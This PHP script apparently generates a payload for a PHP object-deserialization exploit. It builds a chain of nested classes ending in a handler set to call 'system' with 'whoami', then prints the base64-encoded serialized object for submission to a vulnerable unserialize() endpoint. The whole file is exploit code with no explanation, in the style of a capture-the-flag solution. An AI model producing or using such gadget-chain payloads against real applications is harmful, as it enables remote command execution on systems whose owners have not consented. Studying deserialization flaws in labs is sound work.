<?php


interface IProcess {
    public function process();
}
abstract class BaseHandler {
    public $functionName;
    public $functionArgs;

    public function __construct($functionName, $functionArgs = []) {
        $this->functionName = $functionName;
        $this->functionArgs = $functionArgs;
    }

    abstract public function execute();
}

class FileHandler
{
    private $isAllowed;
    public function __construct($functionName, $functionArgs = [], $isAllowed = true) {
//        parent::__construct($functionName, $functionArgs);
        $this->functionName=$functionName;
        $this->functionArgs=$functionArgs;
        $this->isAllowed = $isAllowed;
    }
}

class FileReader
{
    private $handler;
    private $isReady;
    public function __construct() {
        $this->handler = new FileHandler("system",array("whoami"));
        $this->isReady = true;
    }
}

class Action
{
    private $reader;
    private $isInitialized;
    public function __construct() {
        $this->reader = new FileReader();
        $this->isInitialized = true;
    }
}

class Task
{
    private $action;
    private $isSet;
    public function __construct() {
        $this->action = new Action();
        $this->isSet = true;
    }
}


class Processor
{
    private $task;
    private $isConfigured;
    public function __construct() {
        $this->task = new Task();
        $this->isConfigured = true;
    }
}

class MainProcessor {
    private $processor;
    private $isEnabled;

    public function __construct(Processor $processor, $isEnabled = false) {
        $this->processor = $processor;
        $this->isEnabled = $isEnabled;
    }

    public function run() {
        if ($this->isEnabled) {
            return $this->processor->process();
        }
        return 'MainProcessor not enabled';
    }

    public function __toString() {
        return $this->run();
    }
}



class a extends MainProcessor{
    private $processor;
    private $isEnabled;
    public function __construct() {
        $this->processor = new Processor();
        $this->isEnabled = true;
    }
}
echo base64_encode(serialize(new a()));
